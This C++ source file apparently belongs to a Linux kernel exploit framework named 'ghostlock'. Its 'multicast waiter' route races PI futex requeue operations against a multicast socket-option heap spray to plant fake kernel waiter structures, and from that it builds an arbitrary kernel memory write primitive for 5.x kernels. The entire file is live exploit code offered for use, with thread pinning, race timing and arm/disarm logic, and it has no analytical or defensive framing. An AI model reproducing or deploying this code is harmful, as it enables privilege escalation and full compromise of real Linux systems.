#include "routes/multicast_waiter_route.h"

#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "session/exploit_session.hpp"
#include "target.h"

using namespace ghostlock;
using namespace ghostlock::profile;
using namespace ghostlock::config;
using namespace ghostlock::session;
using namespace ghostlock::memory;
using namespace ghostlock::kernel;
using namespace ghostlock::runtime_time;

namespace ghostlock::route::multicast_waiter {

/* Resident Multicast Waiter route owner (CPP13). The process-level instance
 * lives at file scope so every inlined access expands exactly like the
 * validated direct reference; the kernel5_resident_* wrappers in
 * route_operations.cpp forward to it. The two workers and the disarm/destroy
 * helpers stay translation-unit local. */

namespace {
    MulticastWaiterRoute multicast_resident_route;

    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_elapsed_ms(ref);
    }

    static const struct execution_settings *resident_execution_settings(void) {
        return g_exploit_session.profile.execution();
    }

    static void multicast_waiter_interrupt(int sig) {
        (void) sig;
    }

    static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
        struct sched_param sp = {.sched_priority = 0};
        int next = context->scheduler_policy == SCHED_NORMAL
                       ? SCHED_BATCH
                       : SCHED_NORMAL;
        long r = syscall(SYS_sched_setscheduler,
                         context->waiter_tid.load(), next, &sp);
        context->scheduler_policy = next;
        return r;
    }

    static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
                                      uintptr_t target, uintptr_t value,
                                      uintptr_t lock) {
        size_t size = context->layout.buffer_size;
        /* Kept dynamic: the size comes from validated profile geometry and
     * heap-backing it would enter the race window (CPP17 review, retained). */
    __extension__ unsigned char b[size];
        size_t o = context->layout.waiter_offset;
        memset(b, 0, sizeof(b));
        /* Same pure encoder as the one-shot route; the resident also stamps the
     * erase words at the waiter head. */
        if (!encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(b), size},
            o, context->layout.task_offset, context->layout.lock_offset,
            context->task, lock)) {
            return -1;
        }
        if (target) {
            support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
            support::put64(b, o + 8, value);
        }
        uint16_t family = AF_UNSPEC;
        memcpy(b + 8, &family, sizeof(family));
        return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                          b, (socklen_t) sizeof(b));
    }

    static void *multicast_waiter_worker(void *arg) {
        auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
        pin_to_core((size_t) context->consumer_cpu);
        sigset_t set;
        sigemptyset(&set);
        sigaddset(&set, SIGUSR1);
        pthread_sigmask(SIG_UNBLOCK, &set, nullptr);
        context->waiter_tid.store((int) syscall(SYS_gettid));
        support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        context->waiter_has_lock2.store(1);
        while (!context->owner_has_lock1.load()) sched_yield();
        context->waiter_waiting.store(1);
        support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
                          0, nullptr, &context->lock1_futex, 0);
        context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (context->socket_fd < 0) return nullptr;
        multicast_waiter_stamp(context, 0, 0, context->lock);
        context->waiter_ready.store(1);
        while (!context->stop_requested.load()) {
            if (context->respray_requested.exchange(0)) {
                uintptr_t lock = context->lock + context->layout.lock_slots_offset +
                                 ((size_t) context->lock_slot++ % context->layout.lock_slot_count) *
                                 context->layout.lock_slot_stride;
                multicast_waiter_stamp(context, context->target, context->value, lock);
                context->sprayed.store(1);
            }
            sched_yield();
        }
        uint32_t dummy = 0x80000000U | (uint32_t) getpid();
        struct timespec z = {0, 0};
        support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, nullptr, 0);
        support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        while (!context->owner_done.load()) sched_yield();
        close(context->socket_fd);
        context->socket_fd = -1;
        return nullptr;
    }

    static void *multicast_owner_worker(void *arg) {
        auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
        pin_to_core((size_t) context->main_cpu);
        while (!context->waiter_has_lock2.load()) sched_yield();
        support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        context->owner_has_lock1.store(1);
        context->owner_waiting.store(1);
        support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
        context->owner_done.store(1);
        return nullptr;
    }

    static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
        context->stop_requested.store(1);
        context->race->consumer_go.store(0);
        while (context->race->consumer_inflight.load()) sched_yield();
        context->status.kernel_disarmed = 1;
    }

    static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
        if (context->waiter_worker_started) {
            pthread_join(context->waiter_worker, nullptr);
            context->waiter_worker_started = 0;
        }
        if (context->owner_worker_started) {
            pthread_join(context->owner_worker, nullptr);
            context->owner_worker_started = 0;
        }
        if (context->socket_fd >= 0) {
            close(context->socket_fd);
            context->socket_fd = -1;
        }
        context->ready = 0;
        context->status.userspace_clean = 1;
        if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
            context->status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace

int MulticastWaiterRoute::start() noexcept {
    auto *context = this;
    if (context->ready) return 1;
    if (context->waiter_worker_started || context->owner_worker_started) {
        pr_warning("multicast resident remains partially armed; refusing restart\n");
        return 0;
    }
    MulticastWaiterLayout layout_value =
            g_exploit_session.profile.multicast_layout();
    const struct execution_settings *execution = resident_execution_settings();
    context->init(
        &g_exploit_session.race, nullptr, execution, layout_value, 1);
    context->main_cpu = runtime_config_snapshot().main_cpu;
    context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
    uintptr_t bss = g_exploit_session.addresses.data_alias(KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
    context->lock = bss + layout_value.fake_lock_offset;
    context->task = bss + layout_value.fake_task_offset;
    struct sigaction sa = {};
    sa.sa_handler = multicast_waiter_interrupt;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, nullptr) != 0) return 0;
    if (pthread_create(&context->waiter_worker, nullptr,
                       multicast_waiter_worker, context) != 0)
        return 0;
    context->waiter_worker_started = 1;
    if (pthread_create(&context->owner_worker, nullptr,
                       multicast_owner_worker, context) != 0)
        return 0;
    context->owner_worker_started = 1;
    struct timespec ready_started;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!(context->waiter_has_lock2.load() &&
             context->owner_has_lock1.load() &&
             context->waiter_waiting.load() &&
             context->owner_waiting.load())) {
        if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
            return 0;
        sched_yield();
    }
    usleep(execution->multicast_post_requeue_settle_us);
    errno = 0;
    long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
                               1, (void *) 0, &context->lock1_futex, 0);
    context->condition_futex = 1;
    syscall(SYS_tgkill, getpid(), context->waiter_tid.load(), SIGUSR1);
    if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!context->waiter_ready.load() &&
           fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
        sched_yield();
    if (!context->waiter_ready.load() ||
        multicast_waiter_adjust(context) < 0)
        return 0;
    usleep(execution->multicast_post_adjust_settle_us);
    context->ready = 1;
    context->status.code = ROUTE_OK;
    pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
               bss, context->lock, context->task);
    return 1;
}

int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
    auto *context = this;
    if (!context->ready) return 0;
    context->target = target;
    context->value = value;
    context->sprayed.store(0);
    context->respray_requested.store(1);
    while (!context->sprayed.load()) sched_yield();
    long r = multicast_waiter_adjust(context);
    pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
    return r == 0;
}

void MulticastWaiterRoute::stop() noexcept {
    auto *context = this;
    if (!context->ready) {
        if (context->waiter_worker_started || context->owner_worker_started) {
            context->status.code = ROUTE_DIRTY_FAILURE;
            pr_warning("multicast resident partial setup retained for process exit\n");
        }
        return;
    }
    multicast_waiter_disarm(context);
    multicast_waiter_destroy(context);
    /* SESSION-04: the route owns only its route resources; reaping the
     * HeapContext references is the session's step after destroy. */
    g_exploit_session.release_resident_heap();
    pr_success("5.x resident writer disarmed\n");
}

MulticastWaiterRoute &resident_route(void) {
    return multicast_resident_route;
}

} // namespace ghostlock::route::multicast_waiter
